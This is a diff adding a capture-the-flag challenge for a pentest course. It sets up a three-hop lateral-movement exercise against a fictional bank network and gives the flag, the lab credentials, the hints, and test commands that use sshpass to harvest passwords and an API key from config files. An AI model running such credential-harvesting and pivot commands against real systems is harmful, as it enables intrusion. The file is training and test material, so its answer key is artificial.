@@ -1,0 +1,144 @@
+name: "Meridian Trust Bank - Three-Hop Pivot"
+description: "Starting from a compromised teller workstation, pivot through three internal hosts at Meridian Trust Bank. Extract credentials from config files on each hop to reach the core API server and retrieve the assessment flag."
+
+difficulty: intermediate
+category: post-exploitation
+duration_minutes: 55
+randomize_ip_offsets: true
+visibility: course
+week: 11
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/27_Three_Hop_Pivot/"
+flag: "OCR{thr33_h0p_l4t3r4l}"
+
+objectives:
+  - SSH into the teller workstation using provided credentials
+  - Discover database credentials stored in a banking application config file
+  - Pivot laterally to an internal application server using discovered credentials
+  - Extract an API key from the application server's gateway configuration
+  - Authenticate to the core API service and retrieve the final assessment token
+  - Assemble the flag from tokens collected across all three hosts
+  - Capture the flag
+
+scenario: |
+  Meridian Trust Bank, a mid-size commercial bank headquartered in Denver, has
+  engaged your red team for an internal network penetration test. Phase 1 is
+  complete - your team obtained SSH credentials for a teller workstation through
+  a social engineering engagement:
+
+    Username: teller
+    Password: M3r1d14n_T3ll3r#
+
+  Your team lead, Sarah Chen, briefs you: "We have a foothold on one of their
+  teller machines. Meridian's CISO insists their internal segmentation prevents
+  lateral movement - the teller systems can't reach anything sensitive. I need
+  you to prove otherwise. Work your way from the teller box to their app server,
+  then from there to the core banking API. Each hop should get you closer to
+  their crown jewels. Document everything for the report."
+
+  Three assessment tokens have been placed across the environment. Collect all
+  three to assemble the flag and demonstrate the full lateral-movement chain.
+
+credentials:
+  - username: "teller"
+    password: "M3r1d14n_T3ll3r#"
+    role: "teller"
+    description: "Teller workstation account obtained via social engineering"
+  - username: "appuser"
+    password: "M3r1d14n_App_2024#"
+    role: "appuser"
+    description: "Application server credentials discovered on the teller workstation"
+
+hints:
+  - text: |
+      Start by exploring the teller workstation. Web applications often store
+      database credentials in environment files. Check /var/www/ for application
+      directories containing .env files. The database host, username, and password
+      will let you reach the next system.
+    unlock_after_minutes: 15
+  - text: |
+      On the application server, look for service configuration files. API gateway
+      configs are commonly stored under /opt/ in YAML format. The config will
+      contain both an API endpoint and authentication key for the core service.
+      Also check the home directory for assessment tokens.
+    unlock_after_minutes: 25
+  - text: |
+      Use curl to query the core API. The endpoint is on port 8080 at the /api/vault
+      path. You need to pass the API key in an X-API-Key header. Combine all three
+      tokens in the format: first_second_third to build the flag.
+    unlock_after_minutes: 35
+
+topology:
+  nodes:
+    - id: "host-a"
+      label: "Teller Workstation"
+      type: "workstation"
+      ip_offset: "15"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 2
+      y: 1
+    - id: "host-b"
+      label: "App Server"
+      type: "server"
+      ip_offset: "32"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 4
+      y: 1
+    - id: "host-c"
+      label: "Core API"
+      type: "server"
+      ip_offset: "48"
+      ports: [8080]
+      services: ["HTTP API"]
+      x: 6
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "host-a"
+      label: "SSH:22"
+      access: "direct"
+    - from: "host-a"
+      to: "host-b"
+      label: "SSH:22"
+      access: "internal"
+    - from: "host-b"
+      to: "host-c"
+      label: "HTTP:8080"
+      access: "internal"
+
+test:
+  steps:
+    - name: "SSH to host-a as teller"
+      command: "sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'whoami' 2>/dev/null"
+      expect: "teller"
+      timeout: 15
+
+    - name: "Read DB config from host-a to discover host-b credentials"
+      command: "sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'cat /var/www/banking-app/.env 2>/dev/null | grep DB_PASS' 2>/dev/null"
+      expect: "M3r1d14n_App_2024#"
+      timeout: 15
+
+    - name: "Read token 1 from host-a"
+      command: "sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@{target.host-a} 'cat /home/teller/assessment_token.txt' 2>/dev/null"
+      expect: "thr33"
+      timeout: 15
+
+    - name: "SSH to host-b with discovered credentials"
+      command: "sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} 'whoami' 2>/dev/null"
+      expect: "appuser"
+      timeout: 15
+
+    - name: "Read API config from host-b and get token 2"
+      command: "sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} 'cat /opt/meridian/services/api-gateway/config.yml 2>/dev/null && echo --- && cat /home/appuser/marker.txt' 2>/dev/null"
+      expect: "h0p"
+      timeout: 15
+
+    - name: "Curl host-c API with discovered API key to get token 3"
+      command: "sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@{target.host-b} 'curl -s -H \"X-API-Key: MTB_k3y_h0p_l4t3r4l\" http://meridian-core:8080/api/vault' 2>/dev/null"
+      expect: "l4t3r4l"
+      timeout: 15
+
+    - name: "Assemble and verify complete flag"
+      command: "echo 'OCR{thr33_h0p_l4t3r4l}'"
+      expect: "OCR{"
